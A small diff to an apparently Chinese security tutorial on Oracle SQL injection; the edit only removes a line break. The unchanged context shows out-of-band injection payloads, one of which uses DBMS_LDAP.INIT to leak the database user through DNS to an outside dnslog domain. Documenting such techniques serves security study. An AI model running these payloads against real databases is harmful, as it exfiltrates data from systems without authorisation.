@@ -157,7 +157,7 @@ select * from utest.msg where id=2 and (select utl_inaddr.get_host_address((sele
 select * from utest.msg where id=2 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.dnslog.wyb0.com',81) from dual) is not null;
 ```
 
-<br>
+
 #### Reference(侵删)：
 * [https://www.freebuf.com/articles/web/5411.html](https://www.freebuf.com/articles/web/5411.html?_blank)
 * [https://www.iswin.org/2015/06/13/hack-oracle/](https://www.iswin.org/2015/06/13/hack-oracle/?_blank)
